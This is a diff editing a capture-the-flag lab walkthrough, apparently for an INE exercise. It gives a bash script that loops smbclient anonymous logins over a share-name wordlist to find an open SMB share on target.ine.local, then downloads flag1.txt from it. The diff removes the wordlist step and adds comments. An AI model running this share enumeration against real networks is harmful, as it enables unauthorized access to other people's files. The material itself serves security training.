@@ -43,14 +43,17 @@ Paste the following script:
 ```bash
 #!/bin/bash
 
+# Define the target and wordlist location
 TARGET="target.ine.local"
-WORDLIST="./shares.txt"
+WORDLIST="/root/Desktop/wordlists/shares.txt"
 
+# Check if the wordlist file exists
 if [ ! -f "$WORDLIST" ]; then
     echo "Wordlist not found: $WORDLIST"
     exit 1
 fi
 
+# Loop through each share in the wordlist
 while read -r SHARE; do
     echo "Testing share: $SHARE"
     smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
@@ -68,53 +71,7 @@ chmod +x shares.sh
 ```
 ![Step 2 - Created Script](./2.png)
 
-### 🔹 Step 3: Create the Wordlist `shares.txt`
-```text
-publicdata
-communitydata
-openstorage
-freestorage
-accessiblestorage
-pubstorage
-commonstorage
-publicarchive
-sharedarchive
-commonarchive
-pubarchive
-opendocs
-freedocs
-communitydocs
-accessibledocs
-commondocs
-pubdocs
-publicfiles
-openfiles
-freefiles
-sharedfiles
-accessiblefiles
-communityfiles
-commonsfiles
-pubfiles
-openvault
-freevault
-accessiblevault
-publicvault
-commonvault
-openlibrary                                                                                                                                                                                                                                
-pubvault                                                                                                                                                                                                                                   
-freelibrary                                                                                                                                                                                                                                
-accessiblelibrary                                                                                                                                                                                                                          
-worldstoragebin                                                                                                                                                                                                                            
-universalstoragebin                                                                                                                                                                                                                        
-sharedstoragebin                                                                                                                                                                                                                           
-collectivestoragebin                                                                                                                                                                                                                       
-mutualstoragebin                                                                                                                                                                                                                           
-globalarchivebin
-worldarchivebin
-universalarchivebin
-```
-
-### 🔹 Step 4: Run the Script
+### 🔹 Step 3: Run the Script
 ```bash
 ./shares.sh
 ```
@@ -129,7 +86,7 @@ You’ll see lots of denied messages until:
 
 That means pubfiles is accessible anonymously.
 
-### 🔹 Step 5: Access the Share
+### 🔹 Step 4: Access the Share
 ```bash
 smbclient //target.ine.local/pubfiles -N
 ```
@@ -140,7 +97,7 @@ smb: \> ls
 You’ll see something like:
 flag1.txt
 
-### 🔹 Step 6: Download the Flag
+### 🔹 Step 5: Download the Flag
 ```bash
 smb: \> get flag1.txt
 ```
@@ -150,7 +107,7 @@ smb: \> exit
 ```
 ![Step 5 - Retrieved Flag](./5.png)
 
-### 🔹 Step 7: View the Flag
+### 🔹 Step 6: View the Flag
 ```bash
 cat flag1.txt
 ```
